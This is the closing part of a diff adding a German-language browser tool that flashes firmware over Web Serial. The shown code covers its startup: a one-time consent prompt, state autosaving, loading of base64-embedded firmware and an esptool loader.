+else{append("⚠ Web Serial fehlt — Chrome/Edge Desktop nötig.","line-err");$("connect").disabled=true;}
+
+/* ---------- init ---------- */
+// Consent-Gate (einmalig)
+if(!localStorage.getItem("mccConsent"))$("consent").classList.add("open");
+$("consentOk").onclick=()=>{localStorage.setItem("mccConsent","1");$("consent").classList.remove("open");};
+$("consentNo").onclick=()=>{document.body.innerHTML="<p style='padding:40px;font-family:system-ui'>Abgelehnt. Tool nicht nutzbar. Seite schließen.</p>";};
+updCounters();setMode("Idle");restoreState();
+setInterval(()=>{try{saveState();saveLog();}catch(e){}},5000);
+if(window.EMBEDDED_FW_B64){try{autoFwData=atob(window.EMBEDDED_FW_B64);autoFwName=window.EMBEDDED_FW_NAME||"embedded.bin";
+  $("embName").textContent=autoFwName+" ("+(autoFwData.length/1048576).toFixed(2)+" MB)";}catch(e){}}
+else $("embName").textContent="— firmware-embed.js nicht geladen —";
+loadEsptool();fwList();
+</script>
+</body>
+</html>
